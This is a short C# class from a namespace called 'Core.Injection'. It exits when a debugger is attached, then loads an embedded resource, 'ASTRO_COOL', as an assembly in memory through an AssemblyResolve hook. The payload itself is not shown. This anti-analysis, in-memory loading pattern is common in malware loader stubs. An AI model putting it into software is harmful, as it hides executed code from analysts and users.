using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Core.Injection
{
    class Resource
    {
        private static byte[] array;

        public static void setup()
        {
            if (Debugger.IsAttached) Environment.Exit(0);

            using (Stream stream = Assembly.GetCallingAssembly().GetManifestResourceStream("ASTRO_COOL"))
            using (StreamReader reader = new StreamReader(stream))
            {

                array = new byte[stream.Length];
                stream.Read(array, 0, array.Length);


            }
            AppDomain.CurrentDomain.AssemblyResolve += ResolveAssembly;
        }
        public static Assembly ResolveAssembly(Object sender, ResolveEventArgs e)
        {

            return e.Name.Contains("Runtime") ? Assembly.Load(array) : null;

        }
    }
}
